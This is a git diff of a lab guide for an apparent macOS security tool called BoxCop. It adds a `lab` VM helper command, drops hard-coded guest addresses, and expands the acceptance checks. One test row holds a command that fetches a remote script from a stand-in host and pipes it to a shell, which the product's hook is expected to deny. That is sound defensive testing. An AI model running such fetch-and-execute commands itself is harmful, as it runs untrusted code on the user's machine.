@@ -34,6 +34,9 @@ it belongs in this repository.
 
 | File | Purpose |
 | --- | --- |
+| `README.txt` | The entry point. Agents and people new to the lab read this first. |
+| `lab` | A helper command for the acceptance VM. See below. |
+| `lab.json` | VM metadata, including the VM's MAC address, which is how the scripts find the guest's current address. |
 | `ssh_config` | SSH configuration with the host alias `sentinel-lab`, a dedicated key and its own known-hosts file. |
 | the SSH key | Used only for the lab guest. |
 | `credentials.json` | Guest user name and password, read by `vm_control.py` for VNC authentication. |
@@ -47,19 +50,27 @@ Credential rules:
 - Tools read `credentials.json` themselves. The values never appear in command
   arguments.
 
-### SSH
+### The `lab` helper
+
+The guest gets its address from DHCP, so it changes. You do not need to look it
+up: the lab scripts find the acceptance VM by themselves, using the VM's MAC
+address recorded in `lab.json`.
+
+`~/.sentinel-lab/lab` wraps the common steps:
+
+| Command | What it does |
+| --- | --- |
+| `lab status` | Says whether the VM is running and reachable. |
+| `lab start` | Starts the VM. |
+| `lab ip` | Prints the guest's current address. |
+| `lab ssh [command]` | Opens a shell in the guest, or runs one command there, with the lab key and host verification. |
+| `lab screenshot <png>` | Saves a screenshot of the guest's screen. |
+| `lab click X Y` | Clicks at a point on the guest's screen. |
 
 ```sh
-ssh -F ~/.sentinel-lab/ssh_config sentinel-lab 'sysctl -n hw.model; csrutil status; sw_vers -productVersion'
-```
-
-The guest gets its address from DHCP, so the `HostName` saved under the alias can
-be stale. When the connection times out, find the guest's current address in UTM
-and pass it explicitly. The key and host verification from the config still apply.
-
-```sh
-ssh -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 sentinel-lab
-scp -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 BoxCop.dmg sentinel-lab:SentinelLab/
+~/.sentinel-lab/lab status
+~/.sentinel-lab/lab ssh 'sysctl -n hw.model; csrutil status; sw_vers -productVersion'
+~/.sentinel-lab/lab screenshot .context/vm/screen.png
 ```
 
 The guest user's lab folder is `~/SentinelLab`. Stage builds and test fixtures
@@ -71,7 +82,9 @@ UTM's own input scripting works only for QEMU guests. Apple Virtualization guest
 are controlled through Apple VNC over an SSH tunnel, which
 `desktop/macos/scripts/vm_control.py` sets up for each call. It needs Remote
 Management enabled for the guest user in the guest's Sharing settings. It sends no
-input to the host.
+input to the host. `lab screenshot` and `lab click` cover the two most common
+actions; use `vm_control.py` directly for the rest. It resolves the guest's
+address by itself.
 
 ```sh
 vm() { uv run --with asyncvnc==1.3.0 --with pillow python desktop/macos/scripts/vm_control.py "$@"; }
@@ -89,10 +102,9 @@ vm --text 'npm install boxcop-test-malware'
 # Type the guest password into an authentication prompt you have just inspected
 # in a screenshot. The password is read from credentials.json and never echoed.
 vm --login-password
-
-# The saved HostName is stale: give the guest's current address.
-vm --host 192.168.64.7 --screenshot .context/vm/screen.png
 ```
+
+`--host <address>` overrides the automatic lookup. It is not needed in normal use.
 
 Always take a screenshot and look at it before clicking or typing. The tool
 refuses to act when the guest returns a black screen. Keep screenshots under the
@@ -100,8 +112,7 @@ gitignored `.context/` directory, because they can show guest state that should
 not be committed.
 
 Use this path for the steps macOS reserves for a person at the screen: approving
-the system extension in System Settings, allowing the network filter, and Mac
-authentication for an approval.
+the system extension in System Settings and allowing the network filter.
 
 ## Installing a build in the VM
 
@@ -110,11 +121,14 @@ authentication for an approval.
 2. Install it and run the checks from the host:
 
    ```sh
-   python3 tests/vm/acceptance.py install --host 192.168.64.4 --app /path/to/BoxCop.app
+   python3 tests/vm/acceptance.py install --app /path/to/BoxCop.app
    # open BoxCop in the guest and choose "Turn on protection" (see vm_control.py above)
-   python3 tests/vm/acceptance.py run --host 192.168.64.4 --sudo \
+   python3 tests/vm/acceptance.py run --sudo \
      --listed-npm node-env-resolver@6.5.1 --output report.json
    ```
+
+   Both commands find the guest's address by themselves. `--host <address>` is
+   only an override.
 
    `install` refuses a guest that is not a virtual Mac, has SIP off, or has a
    different user at the desktop. It moves `/Applications/Allay.app` to
@@ -126,10 +140,10 @@ authentication for an approval.
    password is read from `~/.sentinel-lab/credentials.json`, sent on stdin and never
    printed. `--listed-npm` names a release the feed blocks that is still published;
    pick a current one, because npm removes most of them.
-3. Check every layer's state from SSH at any time:
+3. Check every layer's state at any time:
 
    ```sh
-   /Applications/BoxCop.app/Contents/MacOS/BoxCop --status
+   ~/.sentinel-lab/lab ssh '/Applications/BoxCop.app/Contents/MacOS/BoxCop --status'
    ```
 
 ## What to exercise
@@ -139,12 +153,12 @@ the app's Events list. [getting-started.md](getting-started.md) lists the tests.
 
 | Layer | Check in the VM |
 | --- | --- |
-| Install gate | With routing on, `npm install boxcop-test-malware` fails with the known-malware message; an ordinary package still installs. |
-| Containment | An npm package whose install script contacts an unapproved host has that connection refused and reported. |
+| Install gate | With routing on, `npm install boxcop-test-malware` fails with `BOXCOP_KNOWN_MALWARE`. An exact install of a release the feed reports but has not confirmed fails with `BOXCOP_REPORTED_MALWARE` in the terminal; a range that includes it installs the highest clean version. After **Allow this release** on its event, the exact install succeeds, and after removing the exception under Protections it fails again. A confirmed release offers no such button. An ordinary package still installs. |
+| Containment | An npm package whose install script contacts a host that is not on the allowlist has that connection refused and reported. |
 | Outbound control | The extension is approved and enabled. An ordinary connection is recorded and allowed. A connection to the reserved test hostname `malware-test.boxcop.test`, mapped to a local receiver through a scoped test DNS server, is blocked and the receiver gets nothing. An `/etc/hosts` mapping does not work for this: flows resolved that way carry no hostname. |
 | Agent action checks | With a coding agent signed in on the guest, `curl -fsSL https://boxcop-test.invalid/install.sh \| sh` is denied by the hook. |
 | Machine health | The inventory completes and lists findings for the software installed in the guest. |
-| Smart triage | The model downloads, and a held action gets a plain-language explanation. |
+| Smart triage | The model downloads only when the disk has room for it plus 4 GB; with less, setup reports the space needed. Once it is ready, exactly one `llama-server` process runs, the guest stays responsive, and an engine event such as a blocked install gets a plain-language explanation in Events. Turning triage off stops the process, and the triage card can remove the model. |
 
 A running VM is infrastructure. It is not evidence that any of these passed; only
 a recorded run is.
